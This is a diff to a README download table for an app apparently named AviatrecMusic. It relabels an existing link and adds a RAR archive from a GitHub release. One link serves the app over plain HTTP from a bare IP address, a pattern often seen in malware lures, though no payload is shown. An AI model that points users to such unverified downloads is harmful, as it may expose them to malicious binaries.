@@ -25,9 +25,10 @@
 
 ## Download
 
-| Version | Link |
-|---------|------|
-| Portable EXE | [Download from Aviatrec Cloud](http://94.190.58.137:5000/download_app)|
+| Format | Link |
+|--------|------|
+|  RAR   | [Download from Aviatrec Cloud](http://94.190.58.137:5000/download_app)|
+|  RAR   | [Download from github](https://github.com/FlowMore-lab/AviatrecMusic/releases/download/Aviatrack/AviatrecMusic.rar)       |
 
 ## System Requirements
 
